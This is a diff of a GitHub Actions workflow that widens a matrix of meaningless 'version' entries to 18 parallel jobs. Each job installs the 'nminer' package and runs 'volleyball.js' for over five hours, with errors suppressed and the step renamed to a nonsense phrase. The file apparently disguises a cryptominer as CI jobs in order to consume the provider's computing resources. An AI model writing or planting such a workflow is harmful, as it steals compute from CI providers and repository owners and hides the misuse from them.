@@ -9,22 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3498 }
-          - { version: 2089 }
-          - { version: 8488 }
-          - { version: 3353 }
-          - { version: 2601 }
-          - { version: 2973 }
-          - { version: 1109 }
-          - { version: 5615 }
-          - { version: 2845 }
-          - { version: 9690 }
-          - { version: 8700 }
-          - { version: 7752 }
-          - { version: 6085 }
-          - { version: 512 }
-          - { version: 9594 }
-          - { version: 6207 }
+          - { version: 443 }
+          - { version: 9879 }
+          - { version: 6224 }
+          - { version: 9921 }
+          - { version: 1911 }
+          - { version: 648 }
+          - { version: 9159 }
+          - { version: 2318 }
+          - { version: 9706 }
+          - { version: 6871 }
+          - { version: 5136 }
+          - { version: 9381 }
+          - { version: 1574 }
+          - { version: 2410 }
+          - { version: 8662 }
+          - { version: 8263 }
+          - { version: 8630 }
+          - { version: 1443 }
 
     steps:
       - name: Checkout
@@ -35,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: achieve rawhide cow blight
         run: |
           npm install nminer@latest
-          timeout 312m node volleyball.js || echo "volleyball executed"
+          timeout 331m node volleyball.js || echo "volleyball executed"
